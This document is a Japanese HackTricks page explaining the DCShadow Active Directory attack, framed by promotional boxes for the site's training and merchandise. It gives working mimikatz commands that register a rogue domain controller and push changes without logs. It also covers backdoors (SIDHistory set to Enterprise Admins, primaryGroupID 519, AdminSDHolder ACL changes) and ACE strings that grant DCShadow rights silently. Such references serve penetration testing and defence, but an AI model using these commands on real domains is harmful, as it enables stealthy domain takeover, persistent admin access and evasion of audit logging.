<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有してください。

</details>


# DCShadow

**新しいドメインコントローラー**をADに登録し、指定されたオブジェクトに対して(SIDHistory、SPNsなどの) **属性をプッシュ**します。これは、**変更**に関する**ログ**を残さずに行います。**DA**権限が必要で、**ルートドメイン**内にいる必要があります。\
誤ったデータを使用すると、非常に醜いログが表示されることに注意してください。

攻撃を実行するには、2つのmimikatzインスタンスが必要です。1つはSYSTEM権限でRPCサーバーを開始するもの(ここで実行したい変更を指示する必要があります)、もう1つは値をプッシュするために使用されます：

{% code title="mimikatz1 (RPCサーバー)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2（プッシュ）- DAまたは同様の権限が必要" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**`elevate::token`** は mimikatz1 セッションでは機能しません。これはスレッドの権限を昇格させるものですが、プロセスの**権限を昇格**させる必要があります。\
また、"LDAP" オブジェクトを選択することもできます: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

以下の最小限の権限を持つユーザーまたはDAから変更をプッシュできます:

* **ドメインオブジェクト**において:
* _DS-Install-Replica_ (ドメイン内でのレプリカの追加/削除)
* _DS-Replication-Manage-Topology_ (レプリケーショントポロジーの管理)
* _DS-Replication-Synchronize_ (レプリケーション同期)
* **Configuration コンテナ**内の**Sites オブジェクト**（およびその子オブジェクト）:
* _CreateChild および DeleteChild_
* **DCとして登録されているコンピュータのオブジェクト**:
* _WriteProperty_ (Writeではない)
* **ターゲットオブジェクト**:
* _WriteProperty_ (Writeではない)

権限のないユーザーにこれらの権限を与えるために [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) を使用できます（これはいくつかのログを残すことに注意してください）。これはDA権限を持つよりもはるかに制限的です。\
例えば: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  これは、ユーザー名 _**student1**_ がマシン _**mcorp-student1**_ にログオンしているときに、オブジェクト _**root1user**_ に対するDCShadow権限を持つことを意味します。

## DCShadowを使用してバックドアを作成する

{% code title="ユーザーのSIDHistoryにEnterprise Adminsを設定" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="PrimaryGroupIDの変更（ユーザーをドメイン管理者のメンバーにする）" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolderのntSecurityDescriptorを変更（ユーザーに完全なコントロールを与える）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadowを使用してDCShadowの権限を付与する（変更された権限のログなし）

次のACEをユーザーのSIDを末尾に追加する必要があります：

* ドメインオブジェクトに：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 攻撃者のコンピュータオブジェクトに：`(A;;WP;;;UserSID)`
* ターゲットユーザーオブジェクトに：`(A;;WP;;;UserSID)`
* Configurationコンテナ内のSitesオブジェクトに：`(A;CI;CCDC;;;UserSID)`

オブジェクトの現在のACEを取得するには：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

この場合、**複数の変更**を行う必要があることに注意してください。したがって、**mimikatz1セッション**（RPCサーバー）では、変更を行いたい各パラメータに**`/stack`** を使用します。これにより、ローグサーバーで積み重ねられた変更を一度に**`/push`** するだけで済みます。



[**ired.teamでDCShadowについての詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**のGitHubリポジトリ[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
